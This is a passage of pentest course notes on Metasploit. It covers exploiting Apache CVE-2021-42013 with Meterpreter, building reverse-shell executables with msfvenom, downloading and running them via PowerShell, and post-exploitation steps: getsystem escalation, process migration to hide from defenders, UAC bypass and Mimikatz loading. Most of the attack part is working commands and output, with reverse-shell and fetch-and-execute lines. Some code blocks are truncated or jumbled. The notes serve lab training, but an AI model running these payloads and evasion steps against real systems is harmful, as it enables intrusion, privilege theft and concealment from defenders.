<li>And more.</li>
</ul>
<p>Let&#39;s display all compatible payloads in the exploit module from the prior section and search for Meterpreter payloads.  Activate a non-staged 64-bit Meterpreter TCP reverse shell payload and display its options.</p>
<pre><code>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; show payloads

Compatible Payloads
===================

   #   Name                                              Disclosure Date  Rank    Check  Description
   -   ----                                              ---------------  ----    -----  -----------
...
   13  payload/linux/x64/meterpreter_reverse_tcp                          normal  No     Linux Meterpreter, Reverse TCP Inline
...

msf6 exploit(multi/http/apache_normalize_path_rce) &gt; set payload 13
payload =&gt; linux/x64/meterpreter_reverse_tcp

                                         ost:port][...]

                                         t.com/docs/using-metasploit/basics/using-metas

View the full module info with the info, or info -d command.

msf6 exploit(multi/http/apache_normalize_path_rce) &gt;
</code></pre>
<p>We should not that all Meterpreter payloads are staged, however the output contains staged and non-staged payloads.  The difference is in how Meterpreter payload is transferred to the target machine.  Non-staged version includes all components required to launch a Meterpreter session while the staged version uses a seperate first stage to load these <a href="https://buffered.io/posts/staged-vs-stageless-handlers/">components</a>.  Loading components over the network creates some traffic and may alert defensive systems.  When our bandwidth is limited or we want to use the same payload to compromise multiple systems in an assessment, the non-staged Meterpreter payload comes in handy.  We will use the non-staged version for the rest of the module.</p>
<p>Run the module with our Meterpreter payload and display available commands when obtain a prompt with <code>help</code>.</p>
<pre><code>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; run

[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://192.168.250.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://192.168.250.16:80 - Attempt to exploit for CVE-2021-42013

<ul>
<li>We receive a promt a few seconds after launching the module.</li>
<li>Commands are divided into categories.</li>
<li>System Commands.</li>

<li>File System Commands.</li>
</ul>
<p>Let&#39;s get familiar with some of the Meterpreter commands, we start gathering info by entering <code>sysinfo</code> and <code>getuid</code>.</p>
<pre><code>meterpreter &gt; sysinfo
Computer     : 172.29.0.2
OS           : Ubuntu 20.04 (Linux 5.4.0-132-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter &gt; getuid
Server username: daemon
meterpreter &gt;
</code></pre>
<ul>
<li>Providing us with info about the target computer, OS, and the current user.</li>
</ul>
<p>As we learned, Metasploit uses sessions to manage access to different machines.  When Metasploit interacts with a system in a session, it uses a concept named channels.  We can start an interactive shell by entering <code>shell</code>, execute a command in the context of a channel, and background the channel the shell runs in.  We use <code>Ctrl+Z</code> to background a channel.</p>
<pre><code>meterpreter &gt; shell
Process 135 created.
Channel 1 created.
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
^Z
Background channel 1? [y/N]  y
meterpreter &gt;
</code></pre>
<p>Next we start a second interactive shell, exec a command, and background the channel.</p>
<pre><code>meterpreter &gt; shell
Process 137 created.
Channel 2 created.
whoami
daemon
^Z
Background channel 2? [y/N]  y
meterpreter &gt;
</code></pre>
<p>Now we can list all active channels and interact with channel 1 again, enter <code>channel -l</code> to list, and <code>channel -i</code> with the channel ID as arg to interact.</p>
<pre><code>meterpreter &gt; channel -l

    Id  Class  Type
    --  -----  ----
    1   3      stdapi_process
    2   3      stdapi_process

meterpreter &gt; channel -i 1
Interacting with channel 1...

id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
</code></pre>
<ul>
<li>We have executed commands in the context of channel 1 again.</li>
<li>Using channels will help us to manage system access and perform post-exploitation ops.</li>
</ul>
<p>next we will use the <code>download</code> and <code>upload</code> commands from the File System Commands category to transfer files to and from the system.  Let&#39;s review the commands in this category again.</p>
<pre><code>Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    chmod         Change the permissions of a file
    cp            Copy source to destination
    del           Delete the specified file
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcat          Read the contents of a local file to the screen
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    upload        Upload a file or directory
</code></pre>
<ul>
<li>Shows various commands we can use for FS ops.</li>
<li>Commands with <code>l</code> prefix operate on the local system.</li>
<li>Change dir for up/down-loading files for instance.</li>
</ul>
<p>Download <code>/etc/passwd</code> from the target machine to our Kali system.  Change local dir to <code>/home/$USER/Downloads</code> first, enter the <code>download</code> command, with <code>/etc/passwd</code> as arg.</p>
<pre><code>meterpreter &gt; lcd /home/operator/Downloads/
meterpreter &gt; lpwd
/home/operator/Downloads
meterpreter &gt; download /etc/passwd 
[*] Downloading: /etc/passwd -&gt; /home/operator/Downloads/passwd
[*] Downloaded 926.00 B of 926.00 B (100.0%): /etc/passwd -&gt; /home/operator/Downloads/passwd
[*] Completed  : /etc/passwd -&gt; /home/operator/Downloads/passwd
meterpreter &gt; lcat /home/operator/Downloads/passwd
root:x:0:0:root:/root:/bin/bash
...
</code></pre>
<ul>
<li>We were able to download <code>/etc/passwd</code> to our local machine.</li>
</ul>
<p>Let&#39;s assume we want to run <code>unix-privesc-check</code>, we will upload it to <code>/tmp</code>.</p>
<pre><code>[*] Uploading  : /usr/bin/unix-privesc-check -&gt; /tmp/unix-privesc-check
[*] Completed  : /usr/bin/unix-privesc-check -&gt; /tmp/unix-privesc-check
meterpreter &gt; ls /tmp
Listing: /tmp
=============

Mode              Size     Type  Last modified              Name

100644/rw-r--r--  36801    fil   2023-11-21 08:35:19 -0800  unix-privesc-check

meterpreter &gt;
</code></pre>
<ul>
<li>Successful upload.</li>
<li>If our target runs Win OS, we need to escape backslashes in dest path like <code>\\</code></li>
</ul>
<p>We used <code>linux/x64/meterpreter_reverse_tcp</code> payload in this section, before moving on we will explore another 64-bit Linux Meterpreter payload.  Exit the current session and use <code>show payloads</code> in the context of the exploit module again.</p>
<pre><code>meterpreter &gt; exit
[*] Shutting down Meterpreter...

[*] 192.168.250.16 - Meterpreter session 2 closed.  Reason: User exit
msf6 exploit(multi/http/apache_normalize_path_rce) &gt; show payloads 

Compatible Payloads
===================

   #   Name                                              Disclosure Date  Rank    Check  Description
   -   ----                                              ---------------  ----    -----  -----------
...
   12  payload/linux/x64/meterpreter_reverse_https                        normal  No     Linux Meterpreter, Reverse HTTPS Inline
</code></pre>
<ul>
<li>This payload uses HTTPS to establish connection and comm.</li>
<li>Encrypted with SSL/TLS.</li>
<li>Defenders will only see info about HTTPS requests.</li>
<li>Without further defensive tech the will be unlikely to decipher the Meterpreter comms.</li>
</ul>
<p>Select the payload and display its options.</p>
<pre><code>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; set payload 12
payload =&gt; linux/x64/meterpreter_reverse_https
msf6 exploit(multi/http/apache_normalize_path_rce) &gt; show options

   Id  Name

</code></pre>
<ul>
<li>There is an additional option <code>LURI</code></li>
<li>This can be used to leverage a single listener on one port.</li>
<li>Capable of handling diff requests based on path in this option.</li>
<li>Provides logical separation.</li>
<li>If left blank it defaults to <code>/</code></li>
</ul>

<ul>
<li>Various events are handled until the Meterpreter session is established.</li>
<li>A monitoring defender would ony see regular HTTPS traffic.</li>
<li>If they were to check the address of the endpoint (Kali), they would get a HTTP 404.</li>
</ul>
<p>In a pentest, we can use this payload to improve our chances of bypassing security technologies and defenders.  However, MSF is well known and detection rates of Meterpreter payloads are high.  Therefore we should always attempt to obtain an initial foothold with a raw TCP shell and deploy Meterpreter shell once we have disabled or bypassed security technology.</p>
<h5>Executable Payloads</h5>
<p>Metasploit can also export payloads into various types of files, Win bins, Linux bins, and webshells for example.  Metasploit contains <a href="https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html">msfvenom</a> as a standalone tool for generating these payloads.  It provides standardized command options and various techniques to customize payloads.</p>
<p>To get familiar with msfvenom we&#39;ll create a mal Win bin that starts a raw TCP rev shell.  Let&#39;s start by listing all payloads with <code>-l</code> and arg <code>payloads</code>.  We will also pass <code>--platform</code> and <code>--arch</code>.</p>
<pre><code class="language-bash">kali@kali:~$ msfvenom -l payloads --platform windows --arch x64 

...
windows/x64/shell/reverse_tcp               Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker (Windows x64)
...
windows/x64/shell_reverse_tcp               Connect back to attacker and spawn a command shell (Windows x64)
...
</code></pre>
<ul>
<li>We can choose between stages and non-staged payloads.</li>
<li>We will use non-staged payload first.</li>
</ul>
<p>Now we use the <code>-p</code> flag to set the payload, set <code>LHOST</code>, and <code>LPORT</code> to assign host and port for the rev shell conn, <code>-f</code> to set the output format to <code>exe</code>, and <code>-o</code> to specify the output file name.</p>
<pre><code class="language-bash">┌──(operator@labhost)-[~/OffSec/msf]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.182 LPORT=443 -f exe -o nonstaged.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: nonstaged.exe
</code></pre>
<p>Now that we have created out mal bin, let&#39;s use it.  First we start a Netcat listener on port 443, Python3 web server on port 80, and connect to BRUTE2 via RDP with user <code>justin</code> and password <code>SuperS3cure1337#</code>.  Then start PowerShell to transfer the file and exec.</p>
<pre><code class="language-powershell">PS C:\Users\justin&gt; iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe

PS C:\Users\justin&gt; .\nonstaged.exe
</code></pre>
<p>Once exec, we return to our Netcat listener.</p>
<pre><code class="language-bash">┌──(operator@labhost)-[~/OffSec/msf]
└─$ nc -nvlp 443 
listening on [any] 443 ...
connect to [192.168.45.182] from (UNKNOWN) [192.168.226.202] 60800
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Users\justin&gt;
</code></pre>
<p>Now we will use a staged payload to perform the same action.  We again use msfvenom to create the staged TCP reverse shell payload.</p>
<pre><code class="language-bash">┌──(operator@labhost)-[~/OffSec/msf]
└─$ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.182 LPORT=443 -f exe -o staged.exe   
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: staged.exe
</code></pre>
<p>We received an incoming conn, but cannot exec any commands.  This is because Netcat does not know how to handle the staged payload.</p>
<pre><code class="language-bash">kali@kali:~$ nc -nvlp 443                                                                                
listening on [any] 443 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.202] 50832
whoami
</code></pre>
<p>To get a functional interactive command prompt we must use Metasploit&#39;s <a href="https://www.rapid7.com/db/modules/exploit/multi/handler/">multi/handler</a> module, which works for most staged, non-staged, and more advanced payloads.</p>
<p>In Metasploit, let&#39;s select the module with <code>use</code>, then specify the payload of our incoming conn, <code>windows/x64/shell/reverse_tcp</code> in this case.  In addition, we set the opions for th payload.  Enter the IP of our Kali machine as <code>LHOST</code> and port 443 for <code>LPORT</code>, then under <code>run</code> to launch the mod.</p>
<pre><code>msf6 &gt; workspace -a execpayloads
[*] Added workspace: execpayloads
[*] Workspace: execpayloads
msf6 &gt; use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; set payload windows/x64/shell/reverse_tcp
payload =&gt; windows/x64/shell/reverse_tcp
msf6 exploit(multi/handler) &gt; show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, proc
                                        ess, none)
   LHOST                      yes       The listen address (an interface may be specifi
                                        ed)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) &gt; set LHOST 192.168.45.182
LHOST =&gt; 192.168.45.182
msf6 exploit(multi/handler) &gt; set LPORT 443
LPORT =&gt; 443
msf6 exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on 192.168.45.182:443 
</code></pre>
<p>With our listener running we can start the <code>staged.exe</code> on BRUTE2, our multi/handler receives the incoming staged payload and provides an interactive shell in the context of a <code>session</code>.</p>
<pre><code>msf6 exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on 192.168.45.182:443 
[*] Sending stage (336 bytes) to 192.168.226.202
[*] Command shell session 1 opened (192.168.45.182:443 -&gt; 192.168.226.202:60810) at 2023-11-22 07:17:20 -0800


Shell Banner:
Microsoft Windows [Version 10.0.20348.169]
-----
          

C:\Users\justin&gt;whoami
whoami
brute2\justin

C:\Users\justin&gt;
</code></pre>
<ul>
<li>For staged and advanced payloads, i.e. Meterpreter, we must use multi/handler.</li>
</ul>
<p>Using <code>run</code> without any args will block the command prompt until exe finishes or we background the session.  As we learned previously, we can use <code>run -j</code> to start the listener in the background, allowing us to continue other work while we wait for the conn.  We can use the <code>jobs</code> command to get a list of currently active jobs, like listeners waiting for conn.</p>
<p>Exit out session and restart with <code>run -j</code>, then list currently active jobs using <code>jobs</code>, once we exec staged.exe MSF will notify us that a new session was created.</p>
<pre><code>msf6 exploit(multi/handler) &gt; run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.45.182:443 
msf6 exploit(multi/handler) &gt; jobs

Jobs
====

  Id  Name                    Payload                        Payload opts
  --  ----                    -------                        ------------
  0   Exploit: multi/handler  windows/x64/shell/reverse_tcp  tcp://192.168.45.182:443

msf6 exploit(multi/handler) &gt; 
[*] Sending stage (336 bytes) to 192.168.226.202
[*] Command shell session 2 opened (192.168.45.182:443 -&gt; 192.168.226.202:60816) at 2023-11-22 07:22:16 -0800

msf6 exploit(multi/handler) &gt; jobs

Jobs
====

No active jobs.

msf6 exploit(multi/handler) &gt; sessions

Active sessions
===============

  Id  Name  Type               Information                  Connection
  --  ----  ----               -----------                  ----------
  2         shell x64/windows  Shell Banner: Microsoft Win  192.168.45.182:443 -&gt; 192.1
                               dows [Version 10.0.20348.16  68.226.202:60816 (192.168.2
                               9] -----                     26.202)

msf6 exploit(multi/handler) &gt;
</code></pre>
<ul>
<li>MSF created a new session for the incoming conn.</li>
<li>Interact with <code>sessions -i</code> passing the session ID as arg.</li>
</ul>
<p>We can use msfvenom generated payloads in various situations during a pen test.</p>
<ul>
<li>Create exec files, transfer to target, and start rev shell.</li>
<li>PowerShell scripts.</li>
<li>Win exe.</li>
<li>Linux executables.</li>
<li>Create web shells to exploit web app vulns.</li>
<li>Use generated files as part of a client side attack.</li>
</ul>

<pre><code>
#### 20.3 Performing Post-Exploitation with Metasploit
 
- Use core Meterpreter post-exploitation features.
- Use post-exploitation modules.
- Perform pivoting with Metasploit.

##### Core Meterpreter Post-Exploitation Features

We used Meterpreter payloads to navigate the FS in the prior section, obtaining info about the target sys, and transftering files to/from our attacking machine.  Apart from these, Meterpreter also contains numerous post-exploitation features.

Let&#39;s explor these features, note that the Linux Mterpreter payload contains less post-exploitation features than the Windows version.  Therefore we will explore these on Win target ITWK01.  Let&#39;s assume we already gained an initial foothold on the target system and deployed a bind shell to access the system.

First, we&#39;ll create a Win bin with msfvenom containing a non-staged Meterpreter payload names `met.exe`
```bash

┌──(operator@labhost)-[~/OffSec/msf]
└─$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.182 LPORT=443 -f exe -o met.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 201820 bytes
Final size of exe file: 208384 bytes
Saved as: met.exe
</code></pre>
<p>Then we launch multi/handler, set options, and run.</p>
<pre><code>
msf6 exploit(multi/handler) &gt; set LPORT 443
LPORT =&gt; 443
msf6 exploit(multi/handler) &gt; set LHOST 192.168.45.182
LHOST =&gt; 192.168.45.182
msf6 exploit(multi/handler) &gt; show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/meterpreter_reverse_https):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   EXITFUNC    process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, pr
                                          ocess, none)
   EXTENSIONS                   no        Comma-separate list of extensions to load
   EXTINIT                      no        Initialization strings for extensions
   LHOST       192.168.45.182   yes       The local listener hostname
   LPORT       443              yes       The local listener port
   LURI                         no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) &gt; run

[*] Started HTTPS reverse handler on https://192.168.45.182:443
</code></pre>
<p>Next we start a Python3 web server, serve <code>met.exe</code>, conn to our bind shell, download our mal exe with PowerShell, and start the bin.</p>
<pre><code class="language-bash">
┌──(operator@labhost)-[~/OffSec/msf]
└─$ nc $IT 4444 
Microsoft Windows [Version 10.0.22000.1219]
(c) Microsoft Corporation. All rights reserved.

C:\Users\luiza&gt;powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\luiza&gt; iwr -uri http://192.168.45.182/met.exe -Outfile met.exe
iwr -uri http://192.168.45.182/met.exe -Outfile met.exe
PS C:\Users\luiza&gt; .\met.exe
.\met.exe
PS C:\Users\luiza&gt;
</code></pre>
<p>Metasploit notifes us that a new session has been opened.</p>
<pre><code>
[*] https://192.168.45.182:443 handling request from 192.168.226.223; (UUID: 7unirfs7) Redirecting stageless connection from /rFTB8XlDRXgroSqjTv68pQG2EEFr with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0&#39;
[*] https://192.168.45.182:443 handling request from 192.168.226.223; (UUID: 7unirfs7) Attaching orphaned/stageless session...
[*] Meterpreter session 1 opened (192.168.45.182:443 -&gt; 192.168.226.223:52494) at 2023-11-23 10:16:41 -0800

meterpreter &gt;
</code></pre>
<p>Now that we have an active Meterpreter session on a Win target we can start exploring our port-exploitation commands/features.</p>
<p>The first post command we use is <code>idletime</code>, which displays how long a user has been idle.  After obtaining basic info about the current user and OS, this should be one of our first commands as it indicated if the target sys is currently in use.</p>
<pre><code>
meterpreter &gt; getuid
Server username: ITWK01\luiza
meterpreter &gt; sysinfo
Computer        : ITWK01
OS              : Windows 10 (10.0 Build 22000).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x64/windows
meterpreter &gt; idletime 
User has been idle for: 26 mins 21 secs
meterpreter &gt;
</code></pre>
<p>The output states that the user has not interacted with the sys for over 26 min, suggesting they stepped away from their computer.  If the results of idletime indicated the user is away, we can take this as an opportunity to exec programs or commands which may display a cli-window, CMD or PS, for a moment.</p>
<p>Several post-exploitation features need admin privs to exec, Metasploit contains a <code>getsystem</code> command, that attempts to auto PrivEsc to NT AUTHORITY\SYSTEM.  It utlizes various techniques using named pipe impersonation and token duplication.  In default settings, <code>getsystem</code> uses all available techiniques shown in the help menu, attempting to leverage SeImersonatePrivilege and SeDebugPrivilege.</p>
<p>Before we exec <code>getsystem</code> let&#39;s start an interactive shell and confirm that our user has one of those two privs assigned.</p>
<pre><code>
meterpreter &gt; shell
Process 1264 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22000.1219]
(c) Microsoft Corporation. All rights reserved.

C:\Users\luiza&gt;whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

C:\Users\luiza&gt;exit
exit
meterpreter &gt;
</code></pre>
<ul>
<li>User <code>luiza</code> has SeImpersontePrivilege assigned.</li>
</ul>
<p>Now let&#39;s use <code>getsystem</code> to attempt to elevate our privs.</p>
<pre><code>
meterpreter &gt; getuid
Server username: ITWK01\luiza

meterpreter &gt; getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
</code></pre>
<ul>
<li><code>getsystem</code> elevated our privs to NT AUTHORITY\SYSTEM by using Named Pipe Impersonation (Print Spooler variant) as we did manually in the Windows Privilege Escalation Module.</li>
</ul>
<p>Another important post module feature is <code>migrate</code>.  When we compromise a host, our Meterpreter payload is executed inside the process of the application we attack or exec our payload.  If the victim stops that process we loose our access to the machine.  Also, depending on how the binary file containing the Meterpreter payload is named, the proc may appear suspiscious to a defender searching through proc list.  We can use migrate to move the execution of our Meterpreter payload to a different proc.</p>
<p>We can view all running procs with <code>ps</code> in the Meterpreter prompt.</p>
<pre><code>
meterpreter &gt; ps

Process List
============

 PID   PPID  Name                         Arch  Session  User                          Path
 ---   ----  ----                         ----  -------  ----                          ----
 2012   8500  met.exe                      x64   0        ITWK01\luiza                  C:\Users\luiza\met.exe 
... 
 5292   4892  OneDrive.exe                 x64   1        ITWK01\offsec                 C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe
...
</code></pre>
<ul>
<li>The proc <code>met.exe</code> has the proc ID 2012.</li>
<li>The name and path will stand out to a reviewing defender.</li>
</ul>
<p>The output shows <code>offsec</code> started a proc related to OneDrive with proc ID 5292.  If our payload runs in this proc, it will be less likely to be detected by reviewing the proc list.</p>
<p>We should be aware that we are only able to migrate into a proc that executes at the same (or lower) integrity and priv level than of our current proc.  In the context of this example, we already gained NT AUTHROTIY/SYSTEM so we have numerous choices.</p>
<p>Let&#39;s migrate our current proc into the <code>OneDrive.exe</code> of the user <code>offsec</code> by entering <code>migrate</code> and the proc ID we want to migrate to.</p>
<pre><code>
meterpreter &gt; migrate 5292
[*] Migrating from 2012 to 5292...
[*] Migration completed successfully.
meterpreter &gt; ps

Process List
============
 PID   PPID  Name                         Arch  Session  User                Path
 ---   ----  ----                         ----  -------  ----                ----
...
 2440   668   svchost.exe
 2472   668   svchost.exe
 2496   668   svchost.exe
 2568   668   svchost.exe
 2624   668   spoolsv.exe
 2660   668   svchost.exe
 2784   668   svchost.exe
 2928   668   svchost.exe
...
</code></pre>
<ul>
<li>We succesfully migrated our proc to the OneDrive proc.</li>
</ul>
<p>When we review the proc list, our original <code>met.exe</code> proc doesn&#39;t exist anymore.  Further, we notice that <code>ps</code> output contains less info than before.  Reason being, we are now running in the context of the proc with the ID 8052 and therefore as user <code>offsec</code>.</p>
<pre><code>
meterpreter &gt; getuid
Server username: ITWK01\offsec
</code></pre>
<p>Instead of migrating to an existing proc or situation in which we won&#39;t find a suitable proc for migration, we can use the <code>execute</code> Meterpreter command.  This command procides the ability to create a new proc, specifying a command or program.</p>
<p>To demonstrate, let&#39;s start a hidden Notepad proc and migrate to it as user <code>offsec</code>.  We use <code>execute</code> with <code>-H</code> to create the proc hidden from view and <code>notepad</code> as arg for <code>-f</code> to specify the command or program to run, then migrate to the spawned proc.</p>
<pre><code>
meterpreter &gt; execute -H -f notepad
Process 3500 created.
meterpreter &gt; migrate 3500
[*] Migrating from 5292 to 3500...
[*] Migration completed successfully.
meterpreter &gt;
</code></pre>
<ul>
<li>Shows we migrated to the newly spawned Notepad proc.</li>
<li>Spawned without GUI, <code>-H</code></li>
<li>Still listed in the proc list.</li>
</ul>
<p><em>Meterpreter offers a variety of other interesting post-exploitation modules such as hashdump, which dumps the contents of the SAM database or screenshare, which displays the target machine&#39;s desktop in real-time.</em></p>
<h5>Post-Exploitation Modules</h5>
<p>In addition to the core functions of Meterpreter, there are several post modules we can deploy against an active session.</p>
<p>Sessions created through attack vectors, the execution of a client side attck for instance, will likely only provide us with an unpriv shell.  If the target user is a member of the local admin group, we can elevate our shell to a high integrity level if we can bypass <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works">User Account Control (UAC)</a>.</p>
<p>In the previous section we migrated Meterpreter to a OneDrive.exe proc, preumably running at medium integrity.  For this section repeat the steps from the prior section and then bypass UAC with a Metasploit post module to obtain a session in the context of a high integrity level proc.</p>
<p>We first connect to the bind shell on port 4444 of TKWK01, download <code>met.exe</code>, and enter <code>getsystem</code> to elev privs.  Then use <code>ps</code> to identify the proc ID of OneDrive.exe and <code>migrate</code> to it.</p>
<p>Connect to bind shell and exev our binary.</p>
<pre><code class="language-bash">
┌──(operator@labhost)-[~/OffSec/msf]
└─$ nc $IT 4444
Microsoft Windows [Version 10.0.22000.1219]
(c) Microsoft Corporation. All rights reserved.

C:\Users\luiza&gt;powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\luiza&gt; iwr -uri http://192.168.45.182/met.exe -Outfile met.exe
iwr -uri http://192.168.45.182/met.exe -Outfile met.exe
PS C:\Users\luiza&gt; .\met.exe
.\met.exe
PS C:\Users\luiza&gt;
</code></pre>
<p>Return to our multi/handler.</p>
<pre><code>
msf6 exploit(multi/handler) &gt; run

[*] Started HTTPS reverse handler on https://192.168.45.182:443
[*] https://192.168.45.182:443 handling request from 192.168.226.223; (UUID: jimautmn) Redirecting stageless connection from /rFTB8XlDRXgroSqjTv6akQZS5QF6abQAzzv1_zbwDs87CcrIqLIzvflY5i with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0&#39;
[*] https://192.168.45.182:443 handling request from 192.168.226.223; (UUID: jimautmn) Attaching orphaned/stageless session...
[*] Meterpreter session 2 opened (192.168.45.182:443 -&gt; 192.168.226.223:52525) at 2023-11-23 12:08:20 -0800

meterpreter &gt; getsystem
[-] Error running command getsystem: Rex::TimeoutError Send timed out
meterpreter &gt; getsystem
[-] Already running as SYSTEM
meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter &gt; ps

Process List
============

 PID   PPID  Name           Arch  Session  User                   Path
 ---   ----  ----           ----  -------  ----                   ----
...
 7092  5292  OneDrive.exe   x64   1        ITWK01\offsec          C:\Users\offsec\AppDa
                                                                  ta\Local\Microsoft\On
                                                                  eDrive\OneDrive.exe
...

meterpreter &gt; migrate 7092
[*] Migrating from 4876 to 7092...
[*] Migration completed successfully.
meterpreter &gt; getuid
Server username: ITWK01\offsec
</code></pre>
<ul>
<li>We are now running in the context of <code>offsec</code></li>
</ul>
<p>While this is an admin account, UAC prevents us from performing admin ops as we learned in prior modules.  Before attempting UAC bypass, confirm that the current proc has integrity level Medium.</p>
<p>To diplay the integrity level of a proc, we can use tools such as <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer">Process Explorer</a> or 3rd-party PowerShell modules such as <a href="https://www.powershellgallery.com/packages/NtObjectManager/1.1.33">NtObjectManager</a>.  Assume the later is installed on the system already.</p>
<p>Once we import the module with <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/import-module?view=powershell-7.2">Import-Module</a> we use <code>Get-NtTokenIntegrityLevel</code> to display the integrity level of the current proc by retrieving and reviewing the assigned access token.</p>
<pre><code>
meterpreter &gt; shell
Process 1512 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22000.1219]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32&gt; Import-Module NtObjectManager
Import-Module NtObjectManager
PS C:\Windows\system32&gt; Get-NtTokenIntegrityLevel
Get-NtTokenIntegrityLevel
Medium
</code></pre>
<ul>
<li>We are operating in the context of integrity level Medium.</li>
</ul>
<p>Next we background the currently active channel and session to search for UAC post modules to leverage.</p>
<pre><code class="language-powershell">
PS C:\Windows\system32&gt; ^Z
Background channel 1? [y/N]  y
meterpreter &gt; bg
[*] Backgrounding session 2...
</code></pre>

<p>To use the mod we activate it and set the <code>SESSION</code> and <code>LHOST</code> options.  Setting the SESSION for a post mod allows us to directly exec the exploit on the active session.  Enter <code>run</code> to launch the module.</p>
<pre><code>

<p>Besides being able to BG the active session and execute module through it, we can load modules through it, we can also load extensions directly inside the active session with the <code>load</code> command.</p>
<p>A great example is Kiwi, which is a Meterpreter extension providing Mimikatz capabilities.  Mimikatz requires SYSTEM, let&#39;s exit the current Meterpreter session, start the listener again, and exe <code>met.exe</code> as user <code>luiza</code> in the bind shell then enter <code>getsystem</code>.</p>
<pre><code>
msf6 exploit(multi/handler) &gt; run

[*] Started HTTPS reverse handler on https://192.168.45.182:443
[*] https://192.168.45.182:443 handling request from 192.168.226.223; (UUID: jzbq1suw) Redirecting stageless connection from /rFTB8XlDRXgroSqjTv6VIASGBxRp7RwO4XlsjMBusd6IdD5_5n82-Fzhm5 with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0&#39;
[*] https://192.168.45.182:443 handling request from 192.168.226.223; (UUID: jzbq1suw) Attaching orphaned/stageless session...

meterpreter &gt; getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
</code></pre>
